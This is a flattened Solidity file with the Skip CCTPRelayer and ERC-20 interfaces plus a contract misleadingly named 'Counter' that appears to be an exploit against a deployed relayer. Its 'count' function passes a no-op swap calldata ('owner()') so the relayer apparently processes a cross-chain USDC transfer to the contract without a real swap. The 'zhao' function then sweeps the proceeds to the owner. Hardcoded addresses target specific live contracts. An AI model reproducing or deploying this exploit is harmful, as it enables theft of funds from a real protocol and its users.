// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.16 ^0.8.13 ^0.8.20;

// src/ICCTPRelayer.sol

/**
 * @dev Interface for Skip CCTPRelayer contract.
 */
interface ICCTPRelayer {
    error ZeroAddress();
    error TransferFailed();
    error ETHSendFailed();
    error MissingBalance();
    error PaymentCannotBeZero();
    error SwapFailed();
    error InsufficientSwapOutput();
    error InsufficientNativeToken();
    error Reentrancy();

    event PaymentForRelay(uint64 nonce, uint256 paymentAmount);

    event FailedReceiveMessage(bytes message, bytes attestation);

    struct ReceiveCall {
        bytes message;
        bytes attestation;
    }

    function makePaymentForRelay(uint64 nonce, uint256 paymentAmount) external;

    function requestCCTPTransfer(
        uint256 transferAmount,
        uint32 destinationDomain,
        bytes32 mintRecipient,
        address burnToken,
        uint256 feeAmount
    ) external;

    function swapAndRequestCCTPTransfer(
        address inputToken,
        uint256 inputAmount,
        bytes memory swapCalldata,
        uint32 destinationDomain,
        bytes32 mintRecipient,
        address burnToken,
        uint256 feeAmount
    ) external payable;
}

// node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol

// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/IERC20.sol)

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// src/Counter.sol

contract Counter {
    ICCTPRelayer public immutable relayer;
    IERC20 public immutable usdc;
    address owner;

    constructor() {
        owner = msg.sender;
        relayer = ICCTPRelayer(0xddAFc591Dda57dCF7b3E9Cf83e72c8591fC9cC24);
        usdc = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    }

    function count(uint256 inputAmount, uint256 feeAmount) external {
        require(msg.sender == owner);
        usdc.approve(address(relayer), inputAmount);

        relayer.swapAndRequestCCTPTransfer(
            address(usdc), // inputToken == usdc
            inputAmount,
            abi.encodeWithSignature("owner()"), // succeeds, moves nothing
            0, // destinationDomain
            bytes32(uint256(uint160(address(this)))),
            address(usdc), // burnToken
            feeAmount
        );
    }

    function zhao() external {
        require(msg.sender == owner);
        usdc.transfer(owner, usdc.balanceOf(address(this)));
    }
}